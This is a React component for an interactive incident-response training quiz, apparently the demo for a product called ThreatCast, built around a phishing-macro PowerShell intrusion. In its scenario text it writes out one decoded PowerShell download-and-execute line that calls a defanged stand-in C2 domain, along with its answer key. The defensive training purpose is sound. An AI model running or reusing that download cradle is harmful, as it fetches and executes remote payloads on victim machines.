"use client";
import { useState } from "react";
import { cn } from "@/lib/utils";

const SCENARIO = {
  narrative: "Your SOC receives a critical alert at 02:47 UTC. Microsoft Defender for Endpoint flags suspicious PowerShell execution on WKSTN-FIN-042 in Finance. The user received a phishing email with a macro-enabled Excel attachment disguised as a quarterly audit spreadsheet.",
  questions: [
    { question: "Defender shows PowerShell executing encoded commands via Excel macro. What is your immediate first action?", context: "Alert: Suspicious PowerShell execution\nHost: WKSTN-FIN-042 (Finance)\nProcess: EXCEL.EXE → powershell.exe -enc aQBlAHgA...\nSeverity: HIGH", options: [{ text: "Immediately isolate the endpoint using Defender's device isolation", points: 100, correct: true }, { text: "Email the user asking them to shut down", points: 0, correct: false }, { text: "Wait for additional alerts before acting", points: 0, correct: false }], explanation: "Network isolation is critical. Encoded PowerShell from a macro is high-confidence IOC. Waiting risks lateral movement. Defender isolation blocks network while maintaining management access.", difficulty: "easy" },
    { question: "After isolating, you decode the PowerShell payload — it's downloading a second-stage binary from a C2. Which MITRE ATT&CK technique should you log?", context: "Decoded: IEX (New-Object Net.WebClient).DownloadString('https://cdn-update[.]com/patch.exe')\nDomain registered: 3 days ago\nHosting: Bulletproof provider", options: [{ text: "T1059.001 — PowerShell", points: 50, correct: false }, { text: "T1105 — Ingress Tool Transfer", points: 100, correct: true }, { text: "T1566.001 — Spearphishing Attachment", points: 50, correct: false }], explanation: "While T1059.001 and T1566.001 are also relevant, downloading a binary from C2 maps directly to T1105 (Ingress Tool Transfer). All three should be logged, but T1105 is primary for this stage.", difficulty: "medium" },
    { question: "Tenable shows 5 more Finance endpoints share the same unpatched CVE-2024-21412 (CVSS 9.8). What's your priority?", context: "Tenable: 6 hosts vulnerable to CVE-2024-21412\nExploit available in the wild\nAll hosts in VLAN-Finance (10.20.30.0/24)\nPatch available but not deployed", options: [{ text: "Start patching all 6 hosts during business hours", points: 30, correct: false }, { text: "Isolate Finance VLAN, scan all 6 for IOCs, then emergency-patch", points: 100, correct: true }, { text: "Create a change request for next maintenance window", points: 0, correct: false }], explanation: "With an active intrusion and 5 additional vulnerable hosts on the same subnet, VLAN isolation + IOC sweep + emergency patching is correct. Waiting for maintenance is unacceptable during an active incident.", difficulty: "hard" },
  ],
};

export default function InteractiveDemo() {
  const [started, setStarted] = useState(false);
  const [q, setQ] = useState(0);
  const [sel, setSel] = useState<number | null>(null);
  const [answered, setAnswered] = useState(false);
  const [score, setScore] = useState(0);
  const [done, setDone] = useState(false);

  if (!started) return (
    <div className="cyber-card border-cyber-600/30 text-center py-8 sm:py-12">
      <p className="text-3xl mb-4">⚡</p>
      <h3 className="font-display text-xl sm:text-2xl font-bold text-white mb-3">Try It Yourself</h3>
      <p className="text-gray-400 text-sm max-w-md mx-auto mb-6">3 questions. Real tools. Real threat. See how ThreatCast exercises feel.</p>
      <button onClick={() => setStarted(true)} className="cyber-btn-primary text-base px-8 py-3">Start Demo Exercise →</button>
    </div>
  );

  if (done) {
    const pct = Math.round((score / 300) * 100);
    return (
      <div className="cyber-card border-cyber-600/30 text-center py-8">
        <p className="text-4xl mb-4">🏁</p>
        <h3 className="font-display text-2xl font-bold text-white mb-2">Demo Complete!</h3>
        <p className="font-display text-4xl font-bold text-cyber-400 my-4">{score}/300</p>
        <p className="text-gray-400 mb-6">{pct >= 80 ? "Impressive — sharp IR instincts." : pct >= 50 ? "Good foundations. ThreatCast will sharpen the gaps." : "This is exactly why tabletop exercises matter."}</p>
        <div className="flex flex-col sm:flex-row gap-3 justify-center">
          <a href="/sign-up" className="cyber-btn-primary px-6 py-3">Start Free — Full Scenarios</a>
          <button onClick={() => { setStarted(false); setQ(0); setScore(0); setDone(false); setSel(null); setAnswered(false); }} className="cyber-btn-secondary px-6 py-3">Try Again</button>
        </div>
      </div>
    );
  }

  const cq = SCENARIO.questions[q];
  return (
    <div className="cyber-card border-cyber-600/30">
      <div className="flex justify-between items-center mb-4"><span className="text-gray-500 text-xs">Q{q + 1} of 3</span><span className="text-cyber-400 font-mono text-sm">{score} pts</span></div>
      <div className="h-1 bg-surface-3 rounded-full mb-6 overflow-hidden"><div className="h-full bg-cyber-500 rounded-full transition-all" style={{ width: `${((q + (answered ? 1 : 0)) / 3) * 100}%` }} /></div>
      {q === 0 && !answered && <div className="mb-6 p-3 rounded-lg bg-surface-0 border border-surface-3"><p className="text-xs text-cyber-400 font-semibold uppercase tracking-wider mb-2">Scenario</p><p className="text-gray-300 text-sm leading-relaxed">{SCENARIO.narrative}</p></div>}
      <span className={cn("cyber-badge text-xs mb-3 inline-block", cq.difficulty === "easy" ? "bg-green-500/20 text-green-400" : cq.difficulty === "medium" ? "bg-yellow-500/20 text-yellow-400" : "bg-red-500/20 text-red-400")}>{cq.difficulty}</span>
      <h4 className="text-white text-sm font-medium mb-3">{cq.question}</h4>
      <div className="cyber-terminal text-xs mb-5 whitespace-pre-wrap">{cq.context}</div>
      <div className="space-y-2 mb-4">{cq.options.map((opt, i) => {
        const isSel = sel === i;
        return (<button key={i} onClick={() => !answered && setSel(i)} disabled={answered}
          className={cn("w-full text-left p-3 rounded-lg border transition-all",
            answered && opt.correct ? "bg-green-500/10 border-green-500" : answered && isSel && !opt.correct ? "bg-red-500/10 border-red-500" : isSel ? "bg-cyber-600/15 border-cyber-500" : "bg-surface-2 border-surface-3 hover:border-surface-4")}>
          <div className="flex items-center gap-3">
            <span className={cn("w-7 h-7 rounded-full flex items-center justify-center text-xs font-semibold flex-shrink-0",
              answered && opt.correct ? "bg-green-500 text-white" : answered && isSel ? "bg-red-500 text-white" : isSel ? "bg-cyber-600 text-white" : "bg-surface-3 text-gray-400")}>
              {answered && opt.correct ? "✓" : answered && isSel ? "✗" : String.fromCharCode(65 + i)}</span>
            <span className="text-sm text-gray-300">{opt.text}</span>
          </div>
        </button>);
      })}</div>
      {answered && <div className="p-3 rounded-lg bg-surface-0 border border-blue-500/20 mb-4"><p className="text-blue-400 font-semibold text-sm mb-1">💡 Explanation</p><p className="text-gray-300 text-xs leading-relaxed">{cq.explanation}</p></div>}
      {!answered ? <button onClick={() => { setAnswered(true); setScore(s => s + (cq.options[sel!]?.points || 0)); }} disabled={sel === null} className="cyber-btn-primary w-full py-3 disabled:opacity-50">Submit Answer</button>
       : <button onClick={() => { if (q < 2) { setQ(q + 1); setSel(null); setAnswered(false); } else setDone(true); }} className="cyber-btn-primary w-full py-3">{q < 2 ? "Next Question →" : "View Results 🏁"}</button>}
    </div>
  );
}
